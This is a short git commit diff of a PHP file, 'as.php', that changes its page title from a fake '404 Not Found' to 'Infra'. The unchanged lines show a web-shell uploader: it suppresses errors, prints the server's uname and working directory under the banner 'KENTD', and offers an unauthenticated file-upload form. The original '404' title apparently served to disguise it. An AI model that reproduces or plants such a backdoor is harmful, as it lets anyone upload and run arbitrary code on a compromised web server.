a1020b381e2486410110be75025b63b7c5d59f38
hamidaso02 <69544220+hamidaso02@users.noreply.github.com>
2022-11-24 00:45:46 -0500

    Update as.php

--- as.php
+++ as.php
@@ -1,6 +1,6 @@
 <?php
 error_reporting(0);
-echo '<title>404 Not Found</title>';
+echo '<title>Infra</title>';
 echo '<center><b><h1>KENTD</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] <br> Posisi : '.$cwd = getcwd(); Echo '<br><br><center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></b>';
 if( $_POST['_upl'] == "Upload" ) {
